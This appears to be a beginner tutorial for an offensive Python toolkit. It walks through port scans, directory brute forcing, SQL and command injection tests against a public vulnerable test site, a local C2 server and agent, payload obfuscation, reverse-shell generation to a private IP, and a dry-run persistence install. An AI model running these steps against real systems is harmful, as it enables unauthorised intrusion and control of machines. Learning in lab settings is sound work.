# Primer 1: Python for Hackers - Complete Getting Started Guide

## Your First 30 Minutes with the Toolkit

This primer is designed to get you up and running with the Python for Hackers toolkit in your first 30 minutes. It covers the absolute essentials to start using the tools immediately.

---

## Table of Contents

1. [Quick Start](#quick-start)
2. [Your First Scan](#your-first-scan)
3. [Your First Web Recon](#your-first-web-recon)
4. [Your First Exploit Test](#your-first-exploit-test)
5. [Your First C2 Session](#your-first-c2-session)
6. [Common First Steps](#common-first-steps)
7. [Troubleshooting Your First Run](#troubleshooting-your-first-run)

---

## Quick Start

### Step 1: Installation (2 minutes)

```bash
# Clone or create the toolkit
cd ~
mkdir hacking-toolkit
cd hacking-toolkit

# Download the install script
cat > install.sh << 'EOF'
# [Copy the complete install.sh from Appendix B]
EOF

# Run installation
chmod +x install.sh
./install.sh
```

### Step 2: Activate Environment (1 minute)

```bash
# Activate the virtual environment
cd ~/hacking-toolkit
source venv/bin/activate

# Verify installation
python3 verify.py
```

**Expected Output:**
```
=== Verification ===
✓ Python 3.10+: 3.10.12
✓ All packages found
✓ All directories exist
✓ Configuration file
✅ Verification complete
```

### Step 3: Set Up Your First Target (2 minutes)

```bash
# For testing, we'll use a local target
# Start a simple HTTP server
python3 -m http.server 8080 &

# Or use a public test target
TARGET="http://testphp.vulnweb.com"
```

---

## Your First Scan

### Scan Localhost (1 minute)

```bash
cd ~/hacking-toolkit/recon

# Quick scan of common ports on localhost
python3 port_scanner.py 127.0.0.1 -p 22,80,443,3306,8080
```

**Expected Output:**
```
[*] Starting port scan on 127.0.0.1
[*] Scanning 5 ports using 50 threads
[*] Timeout: 2.0s, Banner grabbing: True
[*] Start time: 2024-01-15 14:30:25
[+] Port 8080 is OPEN - http-proxy
[*] Progress: 5/5 ports scanned (100.0%)
[*] Scan completed in 0.23 seconds
[*] Found 1 open ports

============================================================
  SCAN RESULTS FOR 127.0.0.1
============================================================

PORT     STATE    SERVICE         VERSION
8080     open     http-proxy      Python http.server

============================================================
Total open ports: 1
Scan duration: 0.23 seconds
[*] Results saved to scan_20240115_143025_127.0.0.1.txt
```

### Quick Scan with Presets (1 minute)

```bash
# Scan web services
python3 quick_scan.py 127.0.0.1 web

# Scan common services
python3 quick_scan.py 127.0.0.1 common
```

### Scan a Real Target (2 minutes)

```bash
# Scan a vulnerable test target
python3 port_scanner.py testphp.vulnweb.com -p 22,80,443,3306
```

---

## Your First Web Recon

### Basic Directory Brute Force (2 minutes)

```bash
cd ~/hacking-toolkit/web-attack

# Brute force common directories on a test target
python3 brute_forcer.py http://testphp.vulnweb.com -w common -t 20
```

**Expected Output:**
```
[*] Starting directory brute force on http://testphp.vulnweb.com
[*] Wordlist: 25 entries
[*] Extensions: None
[*] Threads: 20
[*] Timeout: 10s
[*] Recursive: False
[*] Follow Redirects: False
[*] Excluding statuses: [404]
------------------------------------------------------------
[+] 200    /                                                 12345
[+] 200    /admin                                            567
[+] 200    /login                                            4567
[+] 403    /cpanel                                           234

[*] Scan completed in 2.34 seconds
[*] Total requests: 25
[*] Successful: 4
[*] Failed: 21
[*] Discovered: 4

============================================================
  DIRECTORY BRUTE FORCE RESULTS
============================================================
Target: http://testphp.vulnweb.com
Found: 4 items
------------------------------------------------------------
STATUS   PATH                                               SIZE       TYPE
------------------------------------------------------------
200      /                                                  12345      text/html
200      /admin                                             567        text/html
200      /login                                             4567       text/html
403      /cpanel                                            234        text/html
============================================================
Total: 4 items found
[*] Results saved to bruteforce_20240115_143025.json
```

### Generate a Custom Wordlist (1 minute)

```bash
# Generate a comprehensive wordlist
python3 wordlist_generator.py

# Use it in a scan
python3 brute_forcer.py http://testphp.vulnweb.com -w custom_wordlist.txt -t 30
```

### Analyze a Web Page (2 minutes)

```bash
# Analyze a web page for hidden information
python3 -c "
from html_analyzer import HTMLAnalyzer
analyzer = HTMLAnalyzer()
analysis = analyzer.analyze_url('http://testphp.vulnweb.com')
print(f'Title: {analysis.title}')
print(f'Forms: {len(analysis.forms)}')
print(f'Links: {len(analysis.links)}')
print(f'Comments: {len(analysis.comments)}')
print(f'Emails: {analysis.emails}')
"
```

---

## Your First Exploit Test

### Test for SQL Injection (2 minutes)

```bash
cd ~/hacking-toolkit/exploit

# Test SQL injection on a vulnerable parameter
python3 exploit_framework.py "http://testphp.vulnweb.com/artists.php?id=1" --sql-injection --parameter id --verbose
```

**Expected Output:**
```
[*] Testing SQL injection on http://testphp.vulnweb.com/artists.php?id=1 parameter: id
[*] Testing payload: ' OR '1'='1
[+] Vulnerable to SQL injection with payload: ' OR '1'='1
  [+] EXPLOIT SUCCESSFUL!
    Type: SQL Injection
    Payload: ' OR '1'='1...
```

### Test for Command Injection (2 minutes)

```bash
# Test for command injection
python3 exploit_framework.py "http://testphp.vulnweb.com/page.php" --cmd-injection --parameter cmd --verbose
```

### Run All Exploits (2 minutes)

```bash
# Test all exploit types
python3 exploit_framework.py "http://testphp.vulnweb.com/artists.php?id=1" --all --parameter id --verbose
```

### Basic API Interaction (2 minutes)

```bash
# Test API client with a public API
python3 api_client.py https://jsonplaceholder.typicode.com -e /posts/1

# Perform intelligence gathering
python3 api_client.py https://jsonplaceholder.typicode.com --intel
```

---

## Your First C2 Session

### Start the C2 Server (1 minute)

```bash
cd ~/hacking-toolkit/post-exploit

# Terminal 1: Start the C2 server
python3 c2_server.py
```

**Expected Output:**
```
============================================================
  COMMAND & CONTROL SERVER
============================================================
[*] C2 Server is running!
[*] HTTP endpoint: http://localhost:8443
[*] Press Ctrl+C to stop the server
```

### Start the C2 Agent (1 minute)

```bash
# Terminal 2: Start the agent
python3 c2_agent.py
# Press Enter for default options
```

### Interact with the C2 (2 minutes)

```bash
# Terminal 3: Add tasks via API

# Add a task
curl -X POST http://localhost:8443/c2/task \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"YOUR_AGENT_ID","command":"whoami","description":"Get user"}'

# List agents
curl http://localhost:8443/c2/agents

# Get results
curl http://localhost:8443/c2/results/YOUR_AGENT_ID
```

---

## Common First Steps

### Step 1: Check Your Environment

```bash
cd ~/hacking-toolkit

# Check Python
python3 --version

# Check packages
pip list | grep -E "requests|scapy|flask|psutil"

# Check configuration
cat config/config.yaml

# Test connectivity
ping -c 2 8.8.8.8
```

### Step 2: Run Your First Complete Scan

```bash
cd ~/hacking-toolkit/recon

# Full port scan on localhost
python3 port_scanner.py 127.0.0.1 -p 1-1000 -t 50 -T 2.0 --banners

# Save results
python3 port_scanner.py 127.0.0.1 -p 1-1000 -o my_first_scan.txt
```

### Step 3: Enumerate Your System

```bash
cd ~/hacking-toolkit/post-exploit

# Get system information
python3 enumerator.py --system

# Get full enumeration
python3 enumerator.py --all -o system_info.json

# View results
cat system_info.json | python3 -m json.tool | head -50
```

### Step 4: Obfuscate a Payload

```bash
cd ~/hacking-toolkit/exploit

# Basic obfuscation
python3 obfuscator.py -p "whoami" -t base64,hex,url

# Generate random obfuscation
python3 obfuscator.py -p "whoami" --random

# Generate reverse shell
python3 obfuscator.py --reverse-shell -i 192.168.1.100 -p 4444
```

### Step 5: Test Persistence (Safe Mode)

```bash
cd ~/hacking-toolkit/post-exploit

# Dry run (no changes made)
python3 persistence.py --install test_payload.sh --dry-run

# View what would be installed
python3 persistence.py --install test_payload.sh --dry-run --verbose
```

---

## Troubleshooting Your First Run

### Common Errors and Solutions

#### Error: ModuleNotFoundError

```bash
# Install missing module
pip install missing_module_name

# Or install all requirements
cd ~/hacking-toolkit
pip install -r requirements.txt
```

#### Error: Permission Denied

```bash
# For port scanning (<1024)
sudo python3 port_scanner.py 127.0.0.1 -p 22,80,443

# For packet crafting
sudo python3 packet_crafter.py

# Fix permissions
sudo chown -R $USER:$USER ~/hacking-toolkit
```

#### Error: Connection Refused

```bash
# Check if target is reachable
ping -c 2 TARGET_IP

# Check if service is running
nmap -p PORT TARGET_IP

# Start a test server
python3 -m http.server 8080 &
```

#### Error: Virtual Environment Not Found

```bash
# Recreate virtual environment
cd ~/hacking-toolkit
rm -rf venv
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Quick Test Script

```python
# Save as test_first_run.py
#!/usr/bin/env python3
import sys
import socket
import requests
from scapy.all import IP, TCP

def test_imports():
    print("Testing imports...")
    try:
        import socket
        print("✓ socket")
    except: print("✗ socket")
    
    try:
        import requests
        print("✓ requests")
    except: print("✗ requests")
    
    try:
        from scapy.all import IP, TCP
        print("✓ scapy")
    except: print("✗ scapy")
    
    try:
        import flask
        print("✓ flask")
    except: print("✗ flask")
    
    try:
        import psutil
        print("✓ psutil")
    except: print("✗ psutil")

def test_network():
    print("\nTesting network...")
    try:
        socket.gethostbyname('google.com')
        print("✓ DNS resolution")
    except: print("✗ DNS resolution")
    
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect(('8.8.8.8', 53))
        s.close()
        print("✓ Internet connectivity")
    except: print("✗ Internet connectivity")

def test_http():
    print("\nTesting HTTP...")
    try:
        r = requests.get('https://httpbin.org/get', timeout=5)
        print(f"✓ HTTP request: {r.status_code}")
    except: print("✗ HTTP request")

def main():
    print("="*60)
    print("  PYTHON FOR HACKERS - FIRST RUN TEST")
    print("="*60)
    
    test_imports()
    test_network()
    test_http()
    
    print("\n" + "="*60)
    print("  TEST COMPLETE")
    print("="*60)

if __name__ == "__main__":
    main()
```

### Run the Test

```bash
python3 test_first_run.py
```

### Success Checklist

- [ ] Python 3.10+ installed
- [ ] Virtual environment activated
- [ ] All packages installed
- [ ] Configuration created
- [ ] Port scanner works
- [ ] Web recon works
- [ ] Exploit tests work
- [ ] C2 server starts
- [ ] Obfuscation works

---

## First Project: Scan Your Network

### Complete First Project (5 minutes)

```bash
#!/bin/bash
# my_first_scan.sh - Your first complete scan

echo "=== Python for Hackers - First Scan Project ==="

# 1. Activate environment
cd ~/hacking-toolkit
source venv/bin/activate

# 2. Scan localhost
echo -e "\n[1] Scanning localhost..."
cd recon
python3 port_scanner.py 127.0.0.1 -p 22,80,443,3306,8080 -o localhost_scan.json

# 3. Scan target network
echo -e "\n[2] Scanning target..."
read -p "Enter target IP (or press enter for testphp.vulnweb.com): " TARGET
TARGET=${TARGET:-"testphp.vulnweb.com"}

python3 port_scanner.py $TARGET -p 22,80,443 -o target_scan.json

# 4. Brute force directories
echo -e "\n[3] Directory brute force..."
cd ../web-attack
python3 brute_forcer.py http://$TARGET -w common -t 30 -o web_results.json

# 5. Show results
echo -e "\n[4] Results Summary:"
echo "  - Port scan: localhost_scan.json"
echo "  - Target scan: target_scan.json"
echo "  - Web results: web_results.json"

echo -e "\n✅ First project complete!"
```

### What You've Accomplished

In your first run, you've:
1. ✅ Set up a complete security toolkit
2. ✅ Scanned ports on localhost and a target
3. ✅ Brute-forced web directories
4. ✅ Tested for vulnerabilities
5. ✅ Established a C2 connection
6. ✅ Obfuscated payloads
7. ✅ Enumerated system information
8. ✅ Created your own wordlist

---

## Primer 1 Complete

You are now ready to use the Python for Hackers toolkit. Start with the projects above, then explore the individual modules in depth.

**Next Steps:**
- Review the full series documentation
- Try more advanced scans
- Build your own tools
- Practice on CTF platforms

---

**[PRIMER 1 COMPLETE]**
